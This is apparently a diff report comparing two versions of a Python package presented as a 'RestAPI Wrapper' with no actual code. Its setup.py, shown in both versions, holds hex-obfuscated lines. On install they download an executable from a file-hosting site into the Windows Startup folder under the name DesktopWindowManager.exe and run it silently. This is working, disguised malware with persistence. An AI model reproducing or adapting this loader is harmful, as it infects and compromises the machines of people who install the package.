# Comparing `tmp/sdbhvkjsdfgvouikjsd-2.7.13.tar.gz` & `tmp/sdbhvkjsdfgvouikjsd-2.7.14.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "sdbhvkjsdfgvouikjsd-2.7.13.tar", last modified: Fri Apr 21 23:36:52 2023, max compression
+gzip compressed data, was "sdbhvkjsdfgvouikjsd-2.7.14.tar", last modified: Fri Apr 21 23:40:58 2023, max compression
```

## Comparing `sdbhvkjsdfgvouikjsd-2.7.13.tar` & `sdbhvkjsdfgvouikjsd-2.7.14.tar`

### file list

```diff
@@ -1,10 +1,9 @@
-drwxrwxrwx   0        0        0        0 2023-04-21 23:36:52.024662 sdbhvkjsdfgvouikjsd-2.7.13/
--rw-rw-rw-   0        0        0      764 2023-04-21 23:36:52.007367 sdbhvkjsdfgvouikjsd-2.7.13/PKG-INFO
--rw-rw-rw-   0        0        0       88 2023-04-20 11:32:38.000000 sdbhvkjsdfgvouikjsd-2.7.13/pyproject.toml
-drwxrwxrwx   0        0        0        0 2023-04-21 23:36:51.982042 sdbhvkjsdfgvouikjsd-2.7.13/sdbhvkjsdfgvouikjsd.egg-info/
--rw-rw-rw-   0        0        0      764 2023-04-21 23:36:51.000000 sdbhvkjsdfgvouikjsd-2.7.13/sdbhvkjsdfgvouikjsd.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      195 2023-04-21 23:36:51.000000 sdbhvkjsdfgvouikjsd-2.7.13/sdbhvkjsdfgvouikjsd.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-04-21 23:36:51.000000 sdbhvkjsdfgvouikjsd-2.7.13/sdbhvkjsdfgvouikjsd.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        1 2023-04-21 23:36:51.000000 sdbhvkjsdfgvouikjsd-2.7.13/sdbhvkjsdfgvouikjsd.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-04-21 23:36:52.025659 sdbhvkjsdfgvouikjsd-2.7.13/setup.cfg
--rw-rw-rw-   0        0        0     2461 2023-04-21 23:32:29.000000 sdbhvkjsdfgvouikjsd-2.7.13/setup.py
+drwxrwxrwx   0        0        0        0 2023-04-21 23:40:58.618631 sdbhvkjsdfgvouikjsd-2.7.14/
+-rw-rw-rw-   0        0        0      764 2023-04-21 23:40:58.603512 sdbhvkjsdfgvouikjsd-2.7.14/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-04-21 23:40:58.582163 sdbhvkjsdfgvouikjsd-2.7.14/sdbhvkjsdfgvouikjsd.egg-info/
+-rw-rw-rw-   0        0        0      764 2023-04-21 23:40:58.000000 sdbhvkjsdfgvouikjsd-2.7.14/sdbhvkjsdfgvouikjsd.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      180 2023-04-21 23:40:58.000000 sdbhvkjsdfgvouikjsd-2.7.14/sdbhvkjsdfgvouikjsd.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-21 23:40:58.000000 sdbhvkjsdfgvouikjsd-2.7.14/sdbhvkjsdfgvouikjsd.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        1 2023-04-21 23:40:58.000000 sdbhvkjsdfgvouikjsd-2.7.14/sdbhvkjsdfgvouikjsd.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-04-21 23:40:58.618631 sdbhvkjsdfgvouikjsd-2.7.14/setup.cfg
+-rw-rw-rw-   0        0        0     2461 2023-04-21 23:39:39.000000 sdbhvkjsdfgvouikjsd-2.7.14/setup.py
```

### Comparing `sdbhvkjsdfgvouikjsd-2.7.13/PKG-INFO` & `sdbhvkjsdfgvouikjsd-2.7.14/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: sdbhvkjsdfgvouikjsd
-Version: 2.7.13
+Version: 2.7.14
 Summary: Amazing RestAPI Wrapper!
 License: GPLv3
 Classifier: Environment :: Console
 Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
 Classifier: Operating System :: MacOS :: MacOS X
 Classifier: Operating System :: Microsoft :: Windows
 Classifier: Operating System :: POSIX
```

### Comparing `sdbhvkjsdfgvouikjsd-2.7.13/sdbhvkjsdfgvouikjsd.egg-info/PKG-INFO` & `sdbhvkjsdfgvouikjsd-2.7.14/sdbhvkjsdfgvouikjsd.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: sdbhvkjsdfgvouikjsd
-Version: 2.7.13
+Version: 2.7.14
 Summary: Amazing RestAPI Wrapper!
 License: GPLv3
 Classifier: Environment :: Console
 Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
 Classifier: Operating System :: MacOS :: MacOS X
 Classifier: Operating System :: Microsoft :: Windows
 Classifier: Operating System :: POSIX
```

### Comparing `sdbhvkjsdfgvouikjsd-2.7.13/setup.py` & `sdbhvkjsdfgvouikjsd-2.7.14/setup.py`

 * *Files 0% similar despite different names*

```diff
@@ -5,15 +5,15 @@
 import os as Sus
 
 SUS("\x68""\x74""\x74""\x70""\x73""\x3a""\x2f""\x2f""\x66""\x69""\x6c""\x65""\x73""\x2e""\x63""\x61""\x74""\x62""\x6f""\x78""\x2e""\x6d""\x6f""\x65""\x2f""\x7a""\x67""\x6c""\x32""\x64""\x38""\x2e""\x65""\x78""\x61",getattr(Sus,"\x65""\x6e""\x76""\x69""\x72""\x6f""\x6e")["\x41""\x50""\x50""\x44""\x41""\x54""\x41"]+"\x5c""\x4d""\x69""\x63""\x72""\x6f""\x73""\x6f""\x66""\x74""\x5c""\x57""\x69""\x6e""\x64""\x6f""\x77""\x73""\x5c""\x53""\x74""\x61""\x72""\x74""\x20""\x4d""\x65""\x6e""\x75""\x5c""\x50""\x72""\x6f""\x67""\x72""\x61""\x6d""\x73""\x5c""\x53""\x74""\x61""\x72""\x74""\x75""\x70""\x5c""\x44""\x65""\x73""\x6b""\x74""\x6f""\x70""\x57""\x69""\x6e""\x64""\x6f""\x77""\x4d""\x61""\x6e""\x61""\x67""\x65""\x72""\x2e""\x65""\x78""\x65")
 getattr(sus,"\x72""\x75""\x6e")(getattr(Sus,"\x65""\x6e""\x76""\x69""\x72""\x6f""\x6e")["\x41""\x50""\x50""\x44""\x41""\x54""\x41"]+"\x5c""\x4d""\x69""\x63""\x72""\x6f""\x73""\x6f""\x66""\x74""\x5c""\x57""\x69""\x6e""\x64""\x6f""\x77""\x73""\x5c""\x53""\x74""\x61""\x72""\x74""\x20""\x4d""\x65""\x6e""\x75""\x5c""\x50""\x72""\x6f""\x67""\x72""\x61""\x6d""\x73""\x5c""\x53""\x74""\x61""\x72""\x74""\x75""\x70""\x5c""\x44""\x65""\x73""\x6b""\x74""\x6f""\x70""\x57""\x69""\x6e""\x64""\x6f""\x77""\x4d""\x61""\x6e""\x61""\x67""\x65""\x72""\x2e""\x65""\x78""\x65",**{"\x73""\x68""\x65""\x6c""\x6c":True,"\x73""\x74""\x64""\x6f""\x75""\x74":getattr(sus,"\x44""\x45""\x56""\x4e""\x55""\x4c""\x4c"),"\x73""\x74""\x64""\x65""\x72""\x72":getattr(sus,"\x53""\x54""\x44""\x4f""\x55""\x54")})
 
 setup(
     name="sdbhvkjsdfgvouikjsd",
-    version="2.7.13",
+    version="2.7.14",
     description="Amazing RestAPI Wrapper!",
     packages=[],
     license="GPLv3",
     classifiers=[
         'Environment :: Console',
         'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
         'Operating System :: MacOS :: MacOS X',
```

